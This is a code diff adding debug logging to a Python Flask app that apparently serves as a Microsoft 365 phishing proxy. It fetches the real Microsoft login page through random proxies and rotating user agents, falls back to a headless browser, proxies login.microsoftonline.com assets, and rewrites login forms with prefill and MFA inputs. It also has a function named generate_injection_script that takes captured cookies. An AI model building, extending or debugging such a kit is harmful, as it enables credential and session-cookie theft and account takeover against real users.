@@ -119,8 +119,12 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
     time.sleep(random.uniform(1, 2))
 
     try:
+        print(f"[DEBUG] Fetching {url} with proxy {proxy}")
         resp = requests.get(url, headers=headers, proxies=proxy, timeout=10)
+        print(f"[DEBUG] Response status: {resp.status_code}")
+        print(f"[DEBUG] Response headers: {resp.headers}")
         if "Access Denied" in resp.text or resp.status_code != 200:
+            print(f"[ERROR] Access Denied or bad status code: {resp.status_code}")
             raise Exception("Blocked or error")
         html = resp.text
         soup = BeautifulSoup(html, "html.parser")
@@ -144,8 +148,10 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
             f.write(html)
         return html
     except Exception as e:
+        print(f"[ERROR] Exception in fetch_ms_login: {e}")
         if use_browser_fallback:
             try:
+                print("[DEBUG] Trying browser fallback...")
                 chrome_options = setup_chrome(f"/tmp/chrome_profile_{uuid.uuid4().hex[:6]}")
                 driver = webdriver.Chrome(options=chrome_options)
                 driver.get(url)
@@ -156,6 +162,7 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
                     f.write(html)
                 return html
             except Exception as e2:
+                print(f"[ERROR] Browser fallback failed: {e2}")
                 return "<html><body><h2>Failed to fetch Microsoft login page.</h2></body></html>"
         else:
             return "<html><body><h2>Failed to fetch Microsoft login page.</h2></body></html>"
@@ -233,13 +240,16 @@ def rewrite_form(html, action_url, extra_hidden=None, prefill=None, add_mfa_inpu
 def asset_proxy():
     import mimetypes
     url = request.args.get('url')
+    print(f"[DEBUG] Asset proxy requested for: {url}")
     if not url or not url.startswith("https://login.microsoftonline.com"):
+        print("[ERROR] Invalid asset URL")
         return "Invalid asset URL", 400
 
     safe_name = quote(url, safe='')
     cache_path = os.path.join(ASSET_CACHE_DIR, safe_name)
     now = time.time()
     if os.path.exists(cache_path) and now - os.path.getmtime(cache_path) < CACHE_TTL:
+        print(f"[DEBUG] Serving asset from cache: {cache_path}")
         with open(cache_path, "rb") as f:
             content = f.read()
         content_type = mimetypes.guess_type(url)[0] or 'application/octet-stream'
@@ -250,7 +260,9 @@ def asset_proxy():
     headers = {"User-Agent": random.choice(USER_AGENTS)}
     proxy = get_random_proxy()
     try:
+        print(f"[DEBUG] Fetching asset {url} with proxy {proxy}")
         resp = requests.get(url, headers=headers, proxies=proxy, timeout=10)
+        print(f"[DEBUG] Asset response status: {resp.status_code}")
         content_type = resp.headers.get('Content-Type') or mimetypes.guess_type(url)[0] or 'application/octet-stream'
         with open(cache_path, "wb") as f:
             f.write(resp.content)
@@ -258,6 +270,7 @@ def asset_proxy():
         response.headers['Content-Type'] = content_type
         return response
     except Exception as e:
+        print(f"[ERROR] Asset fetch failed: {e}")
         return "Asset fetch failed", 500
 
 # === LOGIN ROUTES ===
@@ -455,4 +468,3 @@ def generate_injection_script(cookies, session_dir):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=port)
-
